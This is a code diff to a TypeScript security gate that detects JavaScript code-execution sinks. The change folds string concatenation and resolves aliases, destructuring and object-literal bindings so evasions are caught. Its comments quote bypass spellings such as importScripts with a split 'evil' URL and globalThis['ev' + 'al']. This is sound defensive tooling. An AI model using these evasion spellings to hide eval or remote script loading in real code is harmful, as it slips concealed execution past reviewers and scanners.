@@ -402,8 +402,100 @@ export function stringPrefix(t: Token | undefined): string | null {
   return decodeStringBody(interpolation === -1 ? body : body.slice(0, interpolation));
 }
 
+/**
+ * The value of a constant STRING EXPRESSION — a `+` chain over string and
+ * template literals and parenthesised sub-expressions.
+ *
+ * Every predicate below used to read only `arg[0]`, which made concatenation a
+ * universal bypass: `importScripts('ht' + 'tps://evil/x.js')` loads exactly the
+ * same cross-origin script as the whole literal, and `globalThis['ev' + 'al']`
+ * reaches exactly the same sink as `globalThis['eval']`. Whether the pieces are
+ * written apart or together is a SPELLING, so it is folded once, here, and
+ * every caller shares the result.
+ *
+ * `prefix` is the longest statically-known LEADING text — folding stops at the
+ * first operand whose value is unknown (an identifier, a call, a template
+ * interpolation), because everything after it could be anything. `complete`
+ * says nothing was elided, which is what a whole-value comparison needs.
+ * `isString` says the expression evaluates to a string at all: JavaScript `+`
+ * yields a string whenever either operand is one, so a single string anywhere
+ * in the chain is enough — that is what makes `setTimeout(prefix + 'evil()')`
+ * the implicit-eval form even though it does not begin with a literal.
+ */
+interface FoldedString {
+  readonly prefix: string;
+  readonly complete: boolean;
+  readonly isString: boolean;
+}
+
+/** Split `tokens` on top-level `+`, ignoring `+` inside any bracket group. */
+function additionOperands(tokens: readonly Token[]): Token[][] {
+  const operands: Token[][] = [];
+  let current: Token[] = [];
+  let depth = 0;
+  for (const t of tokens) {
+    if (t.kind === 'punct') {
+      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
+      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
+      else if (t.value === '+' && depth === 0) {
+        operands.push(current);
+        current = [];
+        continue;
+      }
+    }
+    current.push(t);
+  }
+  operands.push(current);
+  return operands;
+}
+
+function foldString(tokens: readonly Token[], depth = 0): FoldedString {
+  if (tokens.length === 0 || depth > 16) return { prefix: '', complete: false, isString: false };
+  const operands = additionOperands(tokens);
+
+  let prefix = '';
+  let complete = true;
+  let isString = false;
+  for (const operand of operands) {
+    // A fully parenthesised operand is the same expression one level in.
+    const inner =
+      operand.length > 1 && isPunct(operand[0], '(') && matchGroup(operand, 0) === operand.length
+        ? foldString(operand.slice(1, -1), depth + 1)
+        : null;
+    const part =
+      inner ??
+      (operand.length === 1 && isStringToken(operand[0])
+        ? {
+            prefix: stringPrefix(operand[0]) ?? '',
+            complete: stringValue(operand[0]) !== null,
+            isString: true,
+          }
+        : { prefix: '', complete: false, isString: false });
+
+    if (part.isString) isString = true;
+    if (complete) prefix += part.prefix;
+    if (!part.complete) complete = false;
+  }
+  return { prefix, complete, isString };
+}
+
 /** Global objects through which a sink can be reached by property access. */
 const GLOBAL_RECEIVERS: ReadonlySet<string> = new Set(['globalThis', 'window', 'self']);
+
+/**
+ * The property name inside a computed access `[ … ]` opened at `open`, or null.
+ * The subscript is FOLDED, so `['ev' + 'al']` names `eval`.
+ */
+function computedName(
+  tokens: readonly Token[],
+  open: number,
+): { name: string; next: number } | null {
+  const end = matchGroup(tokens, open);
+  if (end === -1) return null;
+  const folded = foldString(tokens.slice(open + 1, end - 1));
+  if (!folded.complete || !folded.isString) return null;
+  return { name: folded.prefix, next: end };
+}
 
 /**
  * Read a member access at `i` — `.name`, `?.name`, `['name']`, `?.['name']`.
@@ -413,17 +505,10 @@ function readMember(tokens: readonly Token[], i: number): { name: string; next: 
   let k = i;
   if (isPunct(tokens[k], '?.')) k += 1;
   else if (isPunct(tokens[k], '.')) k += 1;
-  else if (isPunct(tokens[k], '[')) {
-    const name = stringValue(tokens[k + 1]);
-    if (name !== null && isPunct(tokens[k + 2], ']')) return { name, next: k + 3 };
-    return null;
-  } else return null;
+  else if (isPunct(tokens[k], '[')) return computedName(tokens, k);
+  else return null;
 
-  if (isPunct(tokens[k], '[')) {
-    const name = stringValue(tokens[k + 1]);
-    if (name !== null && isPunct(tokens[k + 2], ']')) return { name, next: k + 3 };
-    return null;
-  }
+  if (isPunct(tokens[k], '[')) return computedName(tokens, k);
   const t = tokens[k];
   if (t?.kind === 'ident') return { name: t.value, next: k + 1 };
   return null;
@@ -512,13 +597,12 @@ export interface SinkSpec {
  * string the host compiles, so requiring a fully static literal would miss the
  * form an attacker is most likely to use.
  */
-export const isStringLiteral = (arg: readonly Token[]): boolean =>
-  arg.length > 0 && isStringToken(arg[0]);
+export const isStringLiteral = (arg: readonly Token[]): boolean => foldString(arg).isString;
 
 /** The code argument is a string whose STATIC prefix names a REMOTE script. */
 export const isRemoteUrl = (arg: readonly Token[]): boolean => {
-  const value = stringPrefix(arg[0]);
-  return value !== null && (/^https?:\/\//i.test(value) || value.startsWith('//'));
+  const { prefix, isString } = foldString(arg);
+  return isString && (/^https?:\/\//i.test(prefix) || prefix.startsWith('//'));
 };
 
 /**
@@ -639,18 +723,38 @@ export function findSinkInvocations(source: string, specs: readonly SinkSpec[]):
 }
 
 /**
- * Names bound directly to a sink, so `const F = Function; F('x')()` is caught.
+ * Every local name through which a sink can be reached.
  *
- * Deliberately SIMPLE and flow-insensitive: it recognises `NAME = <sink
- * reference>` and treats the binding as holding for the whole file, iterating
- * to a fixpoint so an alias of an alias resolves too. That covers the form an
- * obfuscator or a careless commit actually produces.
+ * `direct` holds `NAME → sink` (`const F = Function`). `members` holds
+ * `OBJECT → property → sink`, which is what makes an object a RECEIVER —
+ * exactly the relationship `globalThis`/`window`/`self` already had, so a
+ * user-defined `const o = { run: eval }` is resolved by the same lookup rather
+ * than by a second mechanism.
+ */
+interface AliasTable {
+  readonly direct: Map<string, SinkSpec>;
+  readonly members: Map<string, Map<string, SinkSpec>>;
+}
+
+/**
+ * Names bound to a sink, so `const F = Function; F('x')()` is caught.
  *
- * What it does NOT do, stated plainly rather than implied: destructuring
- * (`const { eval: e } = globalThis`), a sink stored in an object property or
- * array element, and anything requiring real scope analysis. Those need data
- * flow, not lexing. The CSP remains the runtime half in the browser; in
- * `apps/api`, where there is none, this is the reachable-spelling half.
+ * Deliberately flow-INSENSITIVE: a binding is recognised wherever it is
+ * written and treated as holding for the whole file, iterating to a fixpoint
+ * so an alias of an alias resolves too. Three binding FORMS are read, because
+ * they are three spellings of one act — giving a sink a second name:
+ *
+ *     const F = Function                  → direct
+ *     const { eval: run } = globalThis    → direct, via a receiver's property
+ *     const o = { run: eval }             → member, making `o` a receiver
+ *
+ * What it still does NOT do, stated plainly rather than implied: a sink stored
+ * in an ARRAY element or reached through one, reassignment (the last binding
+ * seen wins), and anything needing real scope analysis — a shadowed name in an
+ * inner block is treated as the outer one. Those need data flow, not lexing;
+ * erring toward reporting is the safe direction for a gate. The CSP remains
+ * the runtime half in the browser; in `apps/api`, where there is none, this is
+ * the reachable-spelling half.
  */
 /**
  * The index of a declaration's INITIALIZER, given the declared name at
@@ -680,28 +784,136 @@ function initializerIndex(tokens: readonly Token[], nameIndex: number): number |
   return null;
 }
 
+/**
+ * The `key` / `key: value` entries of the brace group opened at `open`, at its
+ * top level only. Serves both an object LITERAL and a destructuring PATTERN,
+ * which share this shape.
+ */
+function braceEntries(
+  tokens: readonly Token[],
+  open: number,
+): {
+  entries: Array<{ key: string; valueIndex: number; shorthand: boolean }>;
+  next: number;
+} | null {
+  const end = matchGroup(tokens, open);
+  if (end === -1) return null;
+  const entries: Array<{ key: string; valueIndex: number; shorthand: boolean }> = [];
+  let k = open + 1;
+  while (k < end - 1) {
+    const keyToken = tokens[k];
+    let key: string | null = null;
+    if (keyToken?.kind === 'ident') key = keyToken.value;
+    else if (isStringToken(keyToken)) key = stringValue(keyToken);
+    else if (isPunct(keyToken, '[')) {
+      // A computed key — `{ ['ev' + 'al']: run }` — folds like any subscript.
+      const computed = computedName(tokens, k);
+      if (computed) {
+        key = computed.name;
+        k = computed.next - 1;
+      }
+    }
+    if (key === null) {
+      // Anything unrecognised (a spread, a method, a nested pattern): skip to
+      // the next top-level comma rather than mis-pairing the entries after it.
+      let depth = 0;
+      while (k < end - 1) {
+        const t = tokens[k];
+        if (t?.kind === 'punct') {
+          if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
+          else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
+          else if (t.value === ',' && depth === 0) break;
+        }
+        k += 1;
+      }
+      k += 1;
+      continue;
+    }
+    k += 1;
+    const shorthand = !isPunct(tokens[k], ':');
+    const valueIndex = shorthand ? k - 1 : k + 1;
+    entries.push({ key, valueIndex, shorthand });
+    // Advance past this entry's value to the next top-level comma.
+    let depth = 0;
+    while (k < end - 1) {
+      const t = tokens[k];
+      if (t?.kind === 'punct') {
+        if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
+        else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
+        else if (t.value === ',' && depth === 0) break;
+      }
+      k += 1;
+    }
+    k += 1;
+  }
+  return { entries, next: end };
+}
+
 function collectAliases(
   tokens: readonly Token[],
   specByName: ReadonlyMap<string, SinkSpec>,
-  resolve: (i: number, aliases: ReadonlyMap<string, SinkSpec>) => SinkSpec | null,
-): Map<string, SinkSpec> {
-  const aliases = new Map<string, SinkSpec>();
+  resolve: (i: number, aliases: AliasTable) => SinkSpec | null,
+): AliasTable {
+  const aliases: AliasTable = { direct: new Map(), members: new Map() };
+
+  /** The sink table a receiver expression at `i` exposes, if it is one. */
+  const receiverAt = (i: number): ReadonlyMap<string, SinkSpec> | null => {
+    const t = tokens[i];
+    if (t?.kind !== 'ident') return null;
+    if (GLOBAL_RECEIVERS.has(t.value)) return specByName;
+    return aliases.members.get(t.value) ?? null;
+  };
+
   // A fixpoint: each pass can bind a name to a sink that the previous pass
   // only just learned about. Bounded because every pass either adds a binding
   // or stops.
   for (let pass = 0; pass < 8; pass += 1) {
-    const before = aliases.size;
+    const before = aliases.direct.size + aliases.members.size;
+
     for (let i = 0; i + 2 < tokens.length; i += 1) {
+      // `const { eval: run } = globalThis` — a destructuring PATTERN, whose
+      // properties are read out of the receiver on the right.
+      if (isPunct(tokens[i], '{')) {
+        const group = braceEntries(tokens, i);
+        if (group && isPunct(tokens[group.next], '=')) {
+          const table = receiverAt(group.next + 1);
+          if (table) {
+            for (const entry of group.entries) {
+              const spec = table.get(entry.key);
+              const local = tokens[entry.valueIndex];
+              if (spec && local?.kind === 'ident') aliases.direct.set(local.value, spec);
+            }
+          }
+        }
+        continue;
+      }
+
       const name = tokens[i];
       if (name?.kind !== 'ident' || specByName.has(name.value)) continue;
       const previous = tokens[i - 1];
       if (isPunct(previous, '.') || isPunct(previous, '?.')) continue;
       const initializer = initializerIndex(tokens, i);
       if (initializer === null) continue;
+
+      // `const o = { run: eval }` — an object LITERAL holding sinks makes `o`
+      // a receiver, resolved by the same lookup as `globalThis`.
+      if (isPunct(tokens[initializer], '{')) {
+        const group = braceEntries(tokens, initializer);
+        if (!group) continue;
+        const table = new Map<string, SinkSpec>();
+        for (const entry of group.entries) {
+          const spec = resolve(entry.valueIndex, aliases);
+          if (spec) table.set(entry.key, spec);
+        }
+        if (table.size > 0) aliases.members.set(name.value, table);
+        continue;
+      }
+
       const spec = resolve(initializer, aliases);
-      if (spec) aliases.set(name.value, spec);
+      if (spec) aliases.direct.set(name.value, spec);
     }
-    if (aliases.size === before) break;
+
+    if (aliases.direct.size + aliases.members.size === before) break;
   }
   return aliases;
 }
@@ -720,23 +932,22 @@ function analyse(
    * Covers the bare identifier and the global-object forms; the parenthesized
    * form is handled by the caller, which already knows it is inside a group.
    */
-  const referenceAt = (
-    i: number,
-    aliases: ReadonlyMap<string, SinkSpec>,
-  ): { spec: SinkSpec; next: number } | null => {
+  const referenceAt = (i: number, aliases: AliasTable): { spec: SinkSpec; next: number } | null => {
     const t = tokens[i];
     if (t?.kind !== 'ident') return null;
 
-    // `globalThis.eval`, `self['Function']`, `window?.setTimeout`
-    if (GLOBAL_RECEIVERS.has(t.value)) {
+    // A RECEIVER: `globalThis.eval`, `self['Function']`, `window?.setTimeout`,
+    // and a user object that was seen holding sinks (`const o = { run: eval }`).
+    const table = GLOBAL_RECEIVERS.has(t.value) ? specByName : aliases.members.get(t.value);
+    if (table) {
       const member = readMember(tokens, i + 1);
-      const spec = member ? specByName.get(member.name) : undefined;
+      const spec = member ? table.get(member.name) : undefined;
       if (member && spec) return { spec, next: member.next };
       return null;
     }
 
     // The sink itself, or a NAME BOUND TO IT (`const F = Function`).
-    const spec = specByName.get(t.value) ?? aliases.get(t.value);
+    const spec = specByName.get(t.value) ?? aliases.direct.get(t.value);
     if (!spec) return null;
     // A bare name preceded by a member access is somebody else's property
     // (`redis.eval`, `registry.Function`), not the global sink.
@@ -817,9 +1028,11 @@ function analyse(
         const args = callArguments(tokens, j);
         let arg = args[position.index] ?? [];
         if (position.inArray) {
-          // `.apply(thisArg, ['code', …])` — the code is the array's head.
-          const inner = arg[0] && isPunct(arg[0], '[') ? arg.slice(1) : [];
-          arg = inner;
+          // `.apply(thisArg, ['code', …])` — the code is the array's FIRST
+          // ELEMENT, split out the same way a call's arguments are. Taking the
+          // whole tail instead left the later elements and the closing `]`
+          // attached, which no expression-level predicate can read.
+          arg = isPunct(arg[0], '[') ? (callArguments(arg, 0)[0] ?? []) : [];
         }
         if (spec.codeArgument(arg))
           record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
@@ -865,7 +1078,9 @@ function analyse(
             const isConstruct = member.name === 'construct';
             // apply(fn, thisArg, [args]) → args are the 3rd; construct(fn, [args]) → 2nd.
             const argsArray = args[isConstruct ? 1 : 2] ?? [];
-            const codeArg = argsArray[0] && isPunct(argsArray[0], '[') ? argsArray.slice(1) : [];
+            const codeArg = isPunct(argsArray[0], '[')
+              ? (callArguments(argsArray, 0)[0] ?? [])
+              : [];
             const end = matchGroup(tokens, k);
             if (inner.codeArgument === undefined || inner.codeArgument(codeArg)) {
               record(inner, t, end === -1 ? k + 1 : end);
@@ -917,13 +1132,14 @@ function analyse(
 function findReferenceIn(
   argument: readonly Token[],
   specByName: ReadonlyMap<string, SinkSpec>,
-  aliases: ReadonlyMap<string, SinkSpec>,
+  aliases: AliasTable,
 ): SinkSpec | null {
   const first = argument[0];
   if (first?.kind !== 'ident') return null;
-  if (GLOBAL_RECEIVERS.has(first.value)) {
+  const table = GLOBAL_RECEIVERS.has(first.value) ? specByName : aliases.members.get(first.value);
+  if (table) {
     const member = readMember(argument, 1);
-    return member ? (specByName.get(member.name) ?? null) : null;
+    return member ? (table.get(member.name) ?? null) : null;
   }
-  return specByName.get(first.value) ?? aliases.get(first.value) ?? null;
+  return specByName.get(first.value) ?? aliases.direct.get(first.value) ?? null;
 }
